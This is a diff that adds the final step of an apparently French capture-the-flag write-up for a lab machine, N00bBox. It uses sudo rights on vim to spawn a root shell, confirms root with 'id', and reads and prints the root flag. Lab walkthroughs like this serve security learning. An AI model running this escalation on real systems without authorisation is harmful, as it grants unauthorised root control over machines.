@@ -127,4 +127,21 @@ User noobbox may run the following commands on N00bBox:
     (ALL : ALL) /usr/bin/vim
 ```
 
+Je deviens `root` avec la commande suivante : `vim -c ':!/bin/sh'`
 
+Pour vérifier : `id`
+```
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+Je récupère le flag administrateur :
+```
+cd root
+ls -al
+cat root.txt
+```
+
+Le voici :
+```
+ROOT FLAG : {a4c45279eaad84e5bb8ae0dfc5034400}
+```
